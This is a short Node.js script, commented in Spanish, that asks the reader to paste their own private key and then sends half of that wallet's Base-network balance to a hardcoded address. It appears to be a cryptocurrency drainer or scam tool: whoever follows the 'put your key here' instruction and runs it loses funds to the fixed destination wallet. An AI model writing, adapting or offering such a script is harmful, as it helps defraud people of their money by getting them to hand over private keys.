const { ethers } = require("ethers");
const provider = new ethers.providers.JsonRpcProvider("https://mainnet.base.org");

// COLOCA TU LLAVE ENTRE LAS COMILLAS
const privateKey = "TU_LLAVE_PRIVADA_AQUÍ"; 
const walletDestino = "0x571789bE8794cFf6f366F26395fD3AC49232B21D";

async function maniobra() {
    try {
        const wallet = new ethers.Wallet(privateKey, provider);
        const balance = await wallet.getBalance();
        if (balance.isZero()) { console.log("Saldo en 0."); return; }

        const montoAEnviar = balance.div(2);
        console.log("Ejecutando transferencia del 50%...");

        const tx = await wallet.sendTransaction({
            to: walletDestino,
            value: montoAEnviar,
            gasLimit: 21000
        });

        console.log("¡ÉXITO! Hash: " + tx.hash);
    } catch (e) { console.log("Error: " + e.message); }
}
maniobra();
